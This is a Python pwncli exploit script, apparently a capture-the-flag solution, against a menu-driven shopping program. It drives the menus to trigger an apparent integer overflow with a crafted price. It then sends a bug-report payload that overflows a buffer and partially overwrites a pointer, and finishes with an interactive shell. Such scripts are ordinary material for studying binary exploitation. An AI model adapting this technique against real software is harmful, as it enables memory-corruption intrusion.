#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


context.timeout = 3


def custom_mode():
    p.sendlineafter("\n== SHOPPING ==\n1. Shop mode\n2. Customer mode\n0. Exit\n: ", "2")


def bug_report(change_name="n", name="aa",change_reason="n", reason="bb"):
    p.sendlineafter("\n== SHOPPING ==\n1. Shop mode\n2. Customer mode\n0. Exit\n: ", "-1")
    # msg1 = p.recvlines(2)
    p.sendlineafter("Change name? (y/N) >> ", change_name)
    if change_name.lower() == 'y':
        p.sendlineafter("your name  : ", name)
    
    p.sendlineafter("Change reason? (y/N) >> ", change_reason)
    if change_reason.lower() == 'y':
        p.sendlineafter("when crash : ", reason)


def shop_report_bug(name:(str, bytes), reason:(str, bytes), report_bug='n'):
    p.sendlineafter("Can you cooperate with the bug report? (y/N) >> ", report_bug)
    if report_bug.lower() == 'y':
        p.sendlineafter("your name  : ", name)
        p.sendlineafter("when crash : ", reason)

def shop_mode(bug_name=None, bug_reason=None, has_product=False, report_bug=False):
    p.sendlineafter("\n== SHOPPING ==\n1. Shop mode\n2. Customer mode\n0. Exit\n: ", "1")
    if report_bug:
        shop_report_bug(bug_name, bug_reason, 'y')


def add_product_list(name:(str, bytes), price:int, number:int, has_product=False):
    p.sendlineafter("1. Add Product to list\n2. List Product\n3. Reset Product list\n0. Return\n: ", "1")
    p.sendlineafter("Name >> ", name)
    if not has_product:
        p.sendlineafter("Price >> ", str(price))
    p.sendlineafter("Stock >> ", str(number))


def list_report(n:int=1):
    p.sendlineafter("1. Add Product to list\n2. List Product\n3. Reset Product list\n0. Return\n: ", "2")
    p.recvuntil("\n&&&&&& PRODUCT &&&&&&\n")
    msg = p.recvlines(n)
    info("Get msg: {}".format(msg))
    return msg

def reset_list():
    p.sendlineafter("1. Add Product to list\n2. List Product\n3. Reset Product list\n0. Return\n: ", "3")
   
def logout_shop():
    p.sendlineafter("1. Add Product to list\n2. List Product\n3. Reset Product list\n0. Return\n: ", "0")


def add_cart(product_name:(str, bytes), want_name:int):
    p.sendlineafter("\n#### CUSTOMER MODE ####\n1. Add to Cart\n2. List Cart\n3. Buy\n4. Reset Cart\n0. Return\n: ", "1")
    p.sendlineafter("Product name >> ", product_name)
    p.sendlineafter("Amount >> ", str(want_name))


def list_cart(n:int=1):
    p.sendlineafter("\n#### CUSTOMER MODE ####\n1. Add to Cart\n2. List Cart\n3. Buy\n4. Reset Cart\n0. Return\n: ", "2")
    p.recvuntil("\n$$$$$$ CART $$$$$$\n")
    msg = p.recvlines(n)
    info("Get msg: {}".format(msg))
    return msg

def clear_cart():
    p.sendlineafter("\n#### CUSTOMER MODE ####\n1. Add to Cart\n2. List Cart\n3. Buy\n4. Reset Cart\n0. Return\n: ", "3")
    
def logout_cart():
    p.sendlineafter("\n#### CUSTOMER MODE ####\n1. Add to Cart\n2. List Cart\n3. Buy\n4. Reset Cart\n0. Return\n: ", "0")
    



shop_mode()
add_product_list("product1", 0x55555556, 3)

logout_shop()
custom_mode()

add_cart("product1", 2)
clear_cart()

logout_cart()

shop_mode("name1111"*4, "a"*0x2a+"\x0b\x10", report_bug=True)

add_product_list("product2", 1, 1)
add_product_list("product3", 1, 1)
add_product_list("product4", 1, 1)

# bug_report('y', "lynne", 'y', "huanhuan")

p.interactive()